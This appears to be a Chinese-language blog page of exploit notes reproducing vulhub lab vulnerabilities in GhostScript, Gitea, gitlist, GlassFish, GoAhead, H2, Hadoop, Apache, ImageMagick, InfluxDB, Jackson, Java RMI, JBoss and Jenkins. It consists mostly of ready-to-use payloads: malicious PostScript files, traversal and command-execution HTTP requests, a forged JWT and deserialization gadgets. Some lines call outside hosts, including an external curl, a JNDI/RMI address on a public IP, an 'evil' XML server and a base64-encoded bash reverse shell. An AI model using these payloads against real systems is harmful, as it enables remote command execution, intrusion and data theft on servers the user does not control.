<h3 id="GhostScript-沙箱绕过（命令执行）漏洞（CVE-2018-16509）"><a href="#GhostScript-沙箱绕过（命令执行）漏洞（CVE-2018-16509）" class="headerlink" title="GhostScript 沙箱绕过（命令执行）漏洞（CVE-2018-16509）"></a>GhostScript 沙箱绕过（命令执行）漏洞（CVE-2018-16509）</h3><p>影响版本：GhostScript 9.23、ImageMagick 7.0.8（包括）以前<br>直接上传图片poc，内容如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">%!PS</span><br><span class="line">userdict /setpagedevice undef</span><br><span class="line">save</span><br><span class="line">legal</span><br><span class="line">&#123; null restore &#125; stopped &#123; pop &#125; <span class="keyword">if</span></span><br><span class="line">&#123; legal &#125; stopped &#123; pop &#125; <span class="keyword">if</span></span><br><span class="line">restore</span><br><span class="line">mark /OutputFile (%pipe%id &gt; /tmp/success &amp;&amp; cat /tmp/success) currentdevice putdeviceprops</span><br></pre></td></tr></table></figure></p>
<p>执行命令 id &gt; /tmp/success &amp;&amp; cat /tmp/success</p>
<h3 id="GhostScript-沙箱绕过（命令执行）漏洞（CVE-2018-19475）"><a href="#GhostScript-沙箱绕过（命令执行）漏洞（CVE-2018-19475）" class="headerlink" title="GhostScript 沙箱绕过（命令执行）漏洞（CVE-2018-19475）"></a>GhostScript 沙箱绕过（命令执行）漏洞（CVE-2018-19475）</h3><p>影响版本：GhostScript 9.25、ImageMagick 7.0.8（包括）以前<br>直接上传图片poc，内容如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%!PS</span><br><span class="line">0 1 300367 &#123;&#125; <span class="keyword">for</span></span><br><span class="line">&#123;save restore&#125; stopped &#123;&#125; <span class="keyword">if</span></span><br><span class="line">(%pipe%id &gt; /tmp/success &amp;&amp; cat /tmp/success) (w) file</span><br></pre></td></tr></table></figure></p>
<h3 id="GhostScript-沙箱绕过（命令执行）漏洞（CVE-2019-6116）"><a href="#GhostScript-沙箱绕过（命令执行）漏洞（CVE-2019-6116）" class="headerlink" title="GhostScript 沙箱绕过（命令执行）漏洞（CVE-2019-6116）"></a>GhostScript 沙箱绕过（命令执行）漏洞（CVE-2019-6116）</h3><p>影响版本:GhostScript 9.26、ImageMagick 7.0.8-27（包括）以前<br>直接上传图片<a href="https://github.com/vulhub/vulhub/blob/master/ghostscript/CVE-2019-6116/poc.png" target="_blank" rel="noopener">poc</a></p>
<h2 id="git"><a href="#git" class="headerlink" title="git"></a>git</h2><h3 id="GIT-SHELL-沙盒绕过（CVE-2017-8386）"><a href="#GIT-SHELL-沙盒绕过（CVE-2017-8386）" class="headerlink" title="GIT-SHELL 沙盒绕过（CVE-2017-8386）"></a>GIT-SHELL 沙盒绕过（CVE-2017-8386）</h3><p>任意文件读取、可能的任意命令执行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#进入--help</span></span><br><span class="line">ssh -p 3322 -i id_rsa -t git@127.0.0.1 <span class="string">"git-upload-archive '--help'"</span></span><br><span class="line"><span class="built_in">shift</span>+e 读取任意文件</span><br><span class="line">回到--<span class="built_in">help</span> !id 执行命令</span><br></pre></td></tr></table></figure></p>
<h2 id="gitea"><a href="#gitea" class="headerlink" title="gitea"></a>gitea</h2><p>Gitea是从gogs衍生出的一个开源项目，是一个类似于Github、Gitlab的多用户Git仓库管理平台。其1.4.0版本中有一处逻辑错误，导致未授权用户可以穿越目录，读写任意文件，最终导致执行任意命令。</p>
<h3 id="Gitea-1-4-0-目录穿越导致命令执行漏洞"><a href="#Gitea-1-4-0-目录穿越导致命令执行漏洞" class="headerlink" title="Gitea 1.4.0 目录穿越导致命令执行漏洞"></a>Gitea 1.4.0 目录穿越导致命令执行漏洞</h3><p>找到公开项目，如vulhub/repo,发包<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /vulhub/repo.git/info/lfs/objects HTTP/1.1</span><br><span class="line">Host: your-ip:3000</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: application/vnd.git-lfs+json</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 151</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"Oid"</span>: <span class="string">"....../../../etc/passwd"</span>,</span><br><span class="line">    <span class="string">"Size"</span>: 1000000,</span><br><span class="line">    <span class="string">"User"</span> : <span class="string">"a"</span>,</span><br><span class="line">    <span class="string">"Password"</span> : <span class="string">"a"</span>,</span><br><span class="line">    <span class="string">"Repo"</span> : <span class="string">"a"</span>,</span><br><span class="line">    <span class="string">"Authorization"</span> : <span class="string">"a"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>访问<a href="http://your-ip:3000/vulhub/repo.git/info/lfs/objects/......%2F..%2F..%2Fetc%2Fpasswd/sth" target="_blank" rel="noopener">http://your-ip:3000/vulhub/repo.git/info/lfs/objects/......%2F..%2F..%2Fetc%2Fpasswd/sth</a> 即可</p>
<h2 id="gitlab"><a href="#gitlab" class="headerlink" title="gitlab"></a>gitlab</h2><h3 id="Gitlab-任意文件读取漏洞（CVE-2016-9086"><a href="#Gitlab-任意文件读取漏洞（CVE-2016-9086" class="headerlink" title="Gitlab 任意文件读取漏洞（CVE-2016-9086"></a>Gitlab 任意文件读取漏洞（CVE-2016-9086</h3><p>影响版本：8.9, 8.10, 8.11, 8.12,  8.13<br>利用见<a href="https://github.com/vulhub/vulhub/tree/master/gitlab/CVE-2016-9086" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/gitlab/CVE-2016-9086</a></p>
<h2 id="gitlist"><a href="#gitlist" class="headerlink" title="gitlist"></a>gitlist</h2><p>gitlist是一款使用PHP开发的图形化git仓库查看工具。</p>
<h3 id="gitlist-0-6-0-远程命令执行漏洞"><a href="#gitlist-0-6-0-远程命令执行漏洞" class="headerlink" title="gitlist 0.6.0 远程命令执行漏洞"></a>gitlist 0.6.0 远程命令执行漏洞</h3><p>直接发送数据包<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /example/tree/a/search HTTP/1.1</span><br><span class="line">Host: your-ip:8080</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Content-Length: 56</span><br><span class="line"></span><br><span class="line">query=--open-files-in-pager=touch /tmp/success;</span><br></pre></td></tr></table></figure></p>
<p>/example/tree/a/search，example是项目名称，需要是目标gitlist上一个已存在的项目；a在正常情况下应该是分支的名称，搜索的关键字。<br>没有搜索结果的话，命令不会执行</p>
<h2 id="glassfish"><a href="#glassfish" class="headerlink" title="glassfish"></a>glassfish</h2><p>GlassFish 是一款强健的商业兼容应用服务器</p>
<h3 id="GlassFish-任意文件读取漏洞"><a href="#GlassFish-任意文件读取漏洞" class="headerlink" title="GlassFish 任意文件读取漏洞"></a>GlassFish 任意文件读取漏洞</h3><p>java语言中会把%c0%ae解析为\uC0AE，最后转义为ASCCII字符的.（点）。利用%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/来向上跳转，达到目录穿越、任意文件读取的效果<br>4848端口是GlassFish管理中心,payload<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://your-ip:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd</span><br></pre></td></tr></table></figure></p>
<h2 id="goahead"><a href="#goahead" class="headerlink" title="goahead"></a>goahead</h2><p>GoAhead是一个开源(商业许可)、简单、轻巧、功能强大、可以在多个平台运行的Web Server，多用于嵌入式系统、智能设备。其支持运行ASP、Javascript和标准的CGI程序</p>
<h3 id="GoAhead-远程命令执行漏洞（CVE-2017-17562）"><a href="#GoAhead-远程命令执行漏洞（CVE-2017-17562）" class="headerlink" title="GoAhead 远程命令执行漏洞（CVE-2017-17562）"></a>GoAhead 远程命令执行漏洞（CVE-2017-17562）</h3><p>GoAhead在接收到请求后，将会从URL参数中取出键和值注册进CGI程序的环境变量，且只过滤了REMOTE_HOST和HTTP_AUTHORIZATION。我们能够控制环境变量，就<br>有很多攻击方式。比如在Linux中，LD_开头的环境变量和动态链接库有关，如LD_PRELOAD中指定的动态链接库，将会被自动加载；LD_LIBRARY_PATH指定的路径，<br>程序会去其中寻找动态链接库。<br>我们可以指定LD_PRELOAD=/proc/self/fd/0，因为/proc/self/fd/0是标准输入，而在CGI程序中，POST数据流即为标准输入流。我们编译一个动态链接库，将其<br>放在POST Body中，发送给<a href="http://target/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0，CGI就会加载我们发送的动态链接库，造成远程命令执行漏洞。" target="_blank" rel="noopener">http://target/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0，CGI就会加载我们发送的动态链接库，造成远程命令执行漏洞。</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"></span><br><span class="line">static void before_main(void) __attribute__((constructor));</span><br><span class="line"></span><br><span class="line">static void before_main(void)</span><br><span class="line">&#123;</span><br><span class="line">    write(1, <span class="string">"Hello: World!\n"</span>, 14);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>编译 gcc -shared -fPIC ./payload.c -o payload.so<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST --data-binary @payload.so <span class="string">"http://your-ip:8080/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0"</span> -i</span><br></pre></td></tr></table></figure></p>
<h2 id="gogs"><a href="#gogs" class="headerlink" title="gogs"></a>gogs</h2><p>gogs是一款极易搭建的自助Git服务平台，具有易安装、跨平台、轻量级等特点，使用者众多。</p>
<h3 id="Gogs-任意用户登录漏洞（CVE-2018-18925）"><a href="#Gogs-任意用户登录漏洞（CVE-2018-18925）" class="headerlink" title="Gogs 任意用户登录漏洞（CVE-2018-18925）"></a>Gogs 任意用户登录漏洞（CVE-2018-18925）</h3><p>0.11.66及以前版本中，（go-macaron/session库）没有对sessionid进行校验，攻击者利用恶意sessionid即可读取任意文件，通过控制文件内容来控制session内容，进而登录任意账户<br>利用见 <a href="https://github.com/vulhub/vulhub/blob/master/gogs/CVE-2018-18925/README.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/gogs/CVE-2018-18925/README.md</a></p>
<h2 id="h2database"><a href="#h2database" class="headerlink" title="h2database"></a>h2database</h2><p>H2 database是一款Java内存数据库，多用于单元测试。</p>
<h3 id="H2-Database-Console-未授权访问"><a href="#H2-Database-Console-未授权访问" class="headerlink" title="H2 Database Console 未授权访问"></a>H2 Database Console 未授权访问</h3><p>利用条件：设置如下选项，即可允许外部用户访问Web管理页面，且没有鉴权<br>spring.h2.console.enabled=true<br>spring.h2.console.settings.web-allow-others=true<br>利用这个管理页面，我们可以进行JNDI注入攻击，进而在目标环境下执行任意命令<br>利用：</p>
<ol>
<li>先修改jndi工具中执行的命令 然后启动工具 java -jar JNDI-1.0-all.jar</li>
<li>访问 <a href="http://your-ip:8080/h2-console/" target="_blank" rel="noopener">http://your-ip:8080/h2-console/</a> Driver Class中填写javax.naming.InitialContext<br>JDBC URL 填写 ：rmi://47.95.119.220:23456/BypassByEL   然后connect<br>再进入docker中可以看到命令已经执行<h2 id="hadoop"><a href="#hadoop" class="headerlink" title="hadoop"></a>hadoop</h2>Hadoop实现了一个分布式文件系统，是一个由Apache基金会所开发的分布式系统基础架构。<h3 id="Hadoop-YARN-ResourceManager-未授权访问"><a href="#Hadoop-YARN-ResourceManager-未授权访问" class="headerlink" title="Hadoop YARN ResourceManager 未授权访问"></a>Hadoop YARN ResourceManager 未授权访问</h3>利用过程如下：</li>
<li>在本地监听等待反弹 shell 连接</li>
<li>调用 New Application API 创建 Application</li>
<li>调用 Submit Application API 提交<br><a href="https://github.com/vulhub/vulhub/blob/master/hadoop/unauthorized-yarn/exploit.py" target="_blank" rel="noopener">exp</a><h2 id="httpd"><a href="#httpd" class="headerlink" title="httpd"></a>httpd</h2>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。<h3 id="Apache-HTTPD-换行解析漏洞（CVE-2017-15715）"><a href="#Apache-HTTPD-换行解析漏洞（CVE-2017-15715）" class="headerlink" title="Apache HTTPD 换行解析漏洞（CVE-2017-15715）"></a>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</h3>影响版本：2.4.0~2.4.29<br>上传文件1.php\x0a 访问/1.php%0a 解析成功<h3 id="Apache-HTTPD-多后缀解析漏洞"><a href="#Apache-HTTPD-多后缀解析漏洞" class="headerlink" title="Apache HTTPD 多后缀解析漏洞"></a>Apache HTTPD 多后缀解析漏洞</h3>Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。 如果增加了配置：AddHandler application/x-httpd-php .php<br>那么只要一个文件含有.php 就可以被解析成php文件<h3 id="Apache-SSI-远程命令执行漏洞"><a href="#Apache-SSI-远程命令执行漏洞" class="headerlink" title="Apache SSI 远程命令执行漏洞"></a>Apache SSI 远程命令执行漏洞</h3>利用条件：服务器开启了SSI与CGI<br>利用：上传shell.shtml  内容如下<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--<span class="comment">#exec cmd="ls" --&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>访问shell.shtml 即可看到命令执行结果</p>
<h2 id="imagemagick"><a href="#imagemagick" class="headerlink" title="imagemagick"></a>imagemagick</h2><p>ImageMagick是一款使用量很广的图片处理程序</p>
<h3 id="Imagetragick-命令执行漏洞（CVE-2016–3714）"><a href="#Imagetragick-命令执行漏洞（CVE-2016–3714）" class="headerlink" title="Imagetragick 命令执行漏洞（CVE-2016–3714）"></a>Imagetragick 命令执行漏洞（CVE-2016–3714）</h3><p>影响ImageMagick 6.9.3-9以前所有版本<br>直接上传poc图片,内容如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill <span class="string">'url(https://127.0.0.0/oops.jpg"|curl "www.leavesongs.com:8889)'</span></span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure></p>
<h2 id="influxdb"><a href="#influxdb" class="headerlink" title="influxdb"></a>influxdb</h2><p>influxdb是一款著名的时序数据库，其使用jwt作为鉴权方式。</p>
<h3 id="influxdb未授权访问漏洞"><a href="#influxdb未授权访问漏洞" class="headerlink" title="influxdb未授权访问漏洞"></a>influxdb未授权访问漏洞</h3><p>利用条件：未设置参数shared-secret<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"alg"</span>: <span class="string">"HS256"</span>,</span><br><span class="line">  <span class="string">"typ"</span>: <span class="string">"JWT"</span></span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"username"</span>: <span class="string">"admin"</span>,</span><br><span class="line">  <span class="string">"exp"</span>: 1676346267</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>用<a href="https://jwt.io/生成jwt" target="_blank" rel="noopener">https://jwt.io/生成jwt</a> token<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjc2MzQ2MjY3fQ.NPhb55F0tpsp5X5vcN_IkAAGDfNzV5BA6M4AThhxz6A</span><br></pre></td></tr></table></figure></p>
<p>带上token去访问/query post参数q 就可以执行sql语句</p>
<h2 id="jackson"><a href="#jackson" class="headerlink" title="jackson"></a>jackson</h2><p>Java中处理JSON和XML格式化的类库</p>
<h3 id="Jackson-databind-反序列化漏洞（CVE-2017-7525）"><a href="#Jackson-databind-反序列化漏洞（CVE-2017-7525）" class="headerlink" title="Jackson-databind 反序列化漏洞（CVE-2017-7525）"></a>Jackson-databind 反序列化漏洞（CVE-2017-7525）</h3><p>不懂java，这里只能复现下记下poc<br>CVE-2017-7525 poc(JDK7u21以下的环境)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"param"</span>: [</span><br><span class="line">    <span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">"transletBytecodes"</span>: [</span><br><span class="line">  <span class="string">"yv66vgAAADMAKAoABAAUCQADABUHABYHABcBAAVwYXJhbQEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAcTGNvbS9iMW5nei9zZWMvbW9kZWwvVGFyZ2V0OwEACGdldFBhcmFtAQAUKClMamF2YS9sYW5nL09iamVjdDsBAAhzZXRQYXJhbQEAFShMamF2YS9sYW5nL09iamVjdDspVgEAClNvdXJjZUZpbGUBAAtUYXJnZXQuamF2YQwABwAIDAAFAAYBABpjb20vYjFuZ3ovc2VjL21vZGVsL1RhcmdldAEAEGphdmEvbGFuZy9PYmplY3QBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAZAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwAGwAcCgAaAB0BABV0b3VjaCAvdG1wL3Byb3ZlMS50eHQIAB8BAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAhACIKABoAIwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHACUKACYAFAAhAAMAJgAAAAEAAgAFAAYAAAAEAAEABwAIAAEACQAAAC8AAQABAAAABSq3ACexAAAAAgAKAAAABgABAAAABgALAAAADAABAAAABQAMAA0AAAABAA4ADwABAAkAAAAvAAEAAQAAAAUqtAACsAAAAAIACgAAAAYAAQAAAAoACwAAAAwAAQAAAAUADAANAAAAAQAQABEAAQAJAAAAPgACAAIAAAAGKiu1AAKxAAAAAgAKAAAACgACAAAADgAFAA8ACwAAABYAAgAAAAYADAANAAAAAAAGAAUABgABAAgAGAAIAAEACQAAABYAAgAAAAAACrgAHhIgtgAkV7EAAAAAAAEAEgAAAAIAEw=="</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="string">"transletName"</span>: <span class="string">"a.b"</span>,</span><br><span class="line">      <span class="string">"outputProperties"</span>: &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>CVE-2017-17485 poc<br>先在服务器上创建一个文件 如<a href="http://evil/spel.xml" target="_blank" rel="noopener">http://evil/spel.xml</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;beans xmlns=<span class="string">"http://www.springframework.org/schema/beans"</span></span><br><span class="line">       xmlns:xsi=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span><br><span class="line">       xsi:schemaLocation=<span class="string">"</span></span><br><span class="line"><span class="string">     http://www.springframework.org/schema/beans</span></span><br><span class="line"><span class="string">     http://www.springframework.org/schema/beans/spring-beans.xsd</span></span><br><span class="line"><span class="string">"</span>&gt;</span><br><span class="line">    &lt;bean id=<span class="string">"pb"</span> class=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span><br><span class="line">        &lt;constructor-arg&gt;</span><br><span class="line">            &lt;array&gt;</span><br><span class="line">                &lt;value&gt;touch&lt;/value&gt;</span><br><span class="line">                &lt;value&gt;/tmp/prove2.txt&lt;/value&gt;</span><br><span class="line">            &lt;/array&gt;</span><br><span class="line">        &lt;/constructor-arg&gt;</span><br><span class="line">        &lt;property name=<span class="string">"any"</span> value=<span class="string">"#&#123; pb.start() &#125;"</span>/&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure></p>
<p>然后post poc<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"param"</span>: [</span><br><span class="line">    <span class="string">"org.springframework.context.support.FileSystemXmlApplicationContext"</span>,</span><br><span class="line">    <span class="string">"http://evil/spel.xml"</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><h3 id="Java-RMI-Registry-反序列化漏洞-lt-jdk8u232-b09"><a href="#Java-RMI-Registry-反序列化漏洞-lt-jdk8u232-b09" class="headerlink" title="Java RMI Registry 反序列化漏洞(&lt;jdk8u232_b09)"></a>Java RMI Registry 反序列化漏洞(&lt;jdk8u232_b09)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 开启JRMPListener</span><br><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections6 <span class="string">"curl http://xxxxx.burpcollaborator.net"</span></span><br><span class="line">// 发起攻击</span><br><span class="line">java -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit2 192.168.31.88 1099 jrmphost 8888</span><br></pre></td></tr></table></figure>
<h3 id="Java-RMI-Registry-反序列化漏洞-lt-jdk8u111"><a href="#Java-RMI-Registry-反序列化漏洞-lt-jdk8u111" class="headerlink" title="Java RMI Registry 反序列化漏洞(&lt;=jdk8u111)"></a>Java RMI Registry 反序列化漏洞(&lt;=jdk8u111)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit your-ip 1099 CommonsCollections6 <span class="string">"curl your-dnslog-server"</span></span><br></pre></td></tr></table></figure>
<p>报错是正常的，命令会正常执行</p>
<h2 id="jboss"><a href="#jboss" class="headerlink" title="jboss"></a>jboss</h2><p>是一个基于J2EE的开放源代码的应用服务器。</p>
<h3 id="JBoss-5-x-6-x-反序列化漏洞（CVE-2017-12149）"><a href="#JBoss-5-x-6-x-反序列化漏洞（CVE-2017-12149）" class="headerlink" title="JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）"></a>JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）</h3><p><a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">http://www.jackson-t.ca/runtime-exec-payloads.html</a><br>用这个工具把弹shell的命令编码一下，然后生成poc,利用工具<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections5 <span class="string">"bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS8yMSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span> &gt; poc.ser</span><br></pre></td></tr></table></figure></p>
<p>生成好的POC即为poc.ser，将这个文件作为POST Body发送至/invoker/readonly即可</p>
<h3 id="Boss-4-x-JBossMQ-JMS-反序列化漏洞（CVE-2017-7504）"><a href="#Boss-4-x-JBossMQ-JMS-反序列化漏洞（CVE-2017-7504）" class="headerlink" title="Boss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）"></a>Boss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）</h3><p>利用工具<a href="https://github.com/joaomatosf/JavaDeserH2HC" target="_blank" rel="noopener">JavaDeserH2HC</a>生成poc<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap.java</span><br><span class="line">java -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap <span class="string">"touch /tmp/success"</span></span><br></pre></td></tr></table></figure></p>
<p>生成的poc文件ExampleCommonsCollections1WithHashMap.ser，将该文件作为body发送如下数据包：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://your-ip:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ExampleCommonsCollections1WithHashMap.ser</span><br></pre></td></tr></table></figure></p>
<h3 id="JBoss-JMXInvokerServlet-反序列化漏洞"><a href="#JBoss-JMXInvokerServlet-反序列化漏洞" class="headerlink" title="JBoss JMXInvokerServlet 反序列化漏洞"></a>JBoss JMXInvokerServlet 反序列化漏洞</h3><p>JBoss在处理/invoker/JMXInvokerServlet请求的时候读取了对象，所以我们直接将ysoserial生成好的POC附在POST Body中发送即可<br>poc参考CVE-2017-12149，也可以用这个[工具] (<a href="https://cdn.vulhub.org/deserialization/DeserializeExploit.jar)直接执行命令" target="_blank" rel="noopener">https://cdn.vulhub.org/deserialization/DeserializeExploit.jar)直接执行命令</a></p>
<h2 id="Jenkins"><a href="#Jenkins" class="headerlink" title="Jenkins"></a>Jenkins</h2><p>Jenkins是一个开源软件项目，是基于Java开发的一种持续集成工具，用于监控持续重复的工作</p>
<h3 id="Jenkins-CI-远程代码执行漏洞（CVE-2017-1000353）"><a href="#Jenkins-CI-远程代码执行漏洞（CVE-2017-1000353）" class="headerlink" title="Jenkins-CI 远程代码执行漏洞（CVE-2017-1000353）"></a>Jenkins-CI 远程代码执行漏洞（CVE-2017-1000353）</h3><p>所有Jenkins主版本均受到影响(包括&lt;=2.56版本)<br>所有Jenkins LTS 均受到影响( 包括&lt;=2.46.1版本)<br>利用：</p>
<ol>
<li><p>生成序列化字符串<br>下载<a href="https://github.com/vulhub/CVE-2017-1000353/releases/download/1.1/CVE-2017-1000353-1.1-SNAPSHOT-all.jar" target="_blank" rel="noopener">CVE-2017-1000353-1.1-SNAPSHOT-all.jar</a>,这是生成poc的工具</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar jenkins_poc.ser <span class="string">"touch /tmp/success"</span></span><br></pre></td></tr></table></figure>
</li>
